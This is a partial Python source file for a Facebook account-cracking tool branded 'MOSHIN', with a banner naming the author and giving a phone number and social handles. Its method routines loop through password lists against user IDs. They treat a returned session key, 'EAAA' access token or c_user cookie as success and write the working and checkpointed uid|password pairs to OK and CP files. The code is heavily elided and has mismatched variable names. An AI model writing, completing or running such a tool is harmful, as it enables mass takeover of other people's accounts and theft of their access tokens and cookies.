...
\x1b[0;33m║WELCOME TO MY TOOLS  [🔥 MOSHIN 🔥].  ║
 
\x1b[0;33m║       #TOOL AUTHOR [MUHAMMAD] MOSHIN. ║
...
\x1b[0;33m║#WHATSAPP : 03254985137 😐.  ║
 
\x1b[0;33m║#FACEBOOK : NAME [M.MOSHIN II ].       ║
 
\x1b[0;33m║#GITHUB : https://github.com/IRTAZAHA .   ║
 
\x1b[0;33m║#NOTE.  : I NEED EMOJI NAME ID FOR FREE 🙂💖                  ║
...
def menu():
	...
	elif MOSHIN == "1" or MOSHIN == "01":
 
		publik()
 
		method()
 
	elif MOSHIN == "2" or MOSHIN == "02":
 
		follower()
 
		method()
 
	elif MOSHIN == "3" or  MOSHIN == "03":
 
		massal()
 
		method()
 
	elif Umair == "4" or MOSHIN == "04":
	...
	elif Subhan == "5" or Moshin == "05":
 
		setting_ua()
 
	elif Subhan == "0" or Moshin == "00":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mMOSHIN PRO/FASTER \033[1;97m]")
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[MOSHIN-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
 
				ok.append("%s|%s"%(uid, pw))
 
				open("OK/%s.txt"%(tMoshin),"a").write(" + %s|%s\n"%(uid, pw))
				...
				open("CP/%s.txt"%(MOSHIN),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[MOSHIN-OK] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[MOSHIN-CP] %s|%s\033[0;96m        "%(uid, pw))
 
				cp.append("%s|%s"%(uid, pw))
 
				open("CP/%s.txt"%(tMoshin),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[MOSHIN-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				...
				print("\r\033[0;95m[MOSHIN-CP] %s|%s\033[0;91m        "%(uid, pw))
